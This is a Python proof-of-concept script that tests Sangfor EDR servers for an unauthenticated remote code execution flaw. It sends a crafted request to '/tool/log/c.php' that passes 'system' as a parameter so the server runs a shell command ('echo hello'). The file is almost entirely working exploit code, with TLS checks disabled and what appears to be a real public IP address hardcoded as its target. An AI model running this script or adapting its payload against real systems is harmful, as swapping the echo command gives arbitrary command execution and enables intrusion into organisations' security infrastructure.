import requests
import re
import urllib3
from termcolor import cprint
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class sanfor_edr_rce_BaseVerify():
    def __init__(self,target):
        self.target = target
        self.payload = '/tool/log/c.php?strip_slashes=system&host=echo hello'

    def run(self):
        headers={
            'Connection': 'close',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9'
        }

        url=self.target+self.payload

        try:
            response = requests.get(url,verify=False,headers=headers)
            response.raise_for_status()
            response.encoding = "utf-8"
            res=re.findall(r'<b>Log Helper</b></p>(.+?)<pre><form',response.text,re.S)
            response.close()
          
            if re.search(r'hello',res[0]):
                cprint("[+]存在深信服EDR终端RCE漏洞...(高危)\t","red")
                return True
        except:
            cprint("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

if __name__ == '__main__':

    tarhet = 'https://202.96.186.66:9443/'
    sanfor = sanfor_edr_rce_BaseVerify(tarhet)
    sanfor.run()


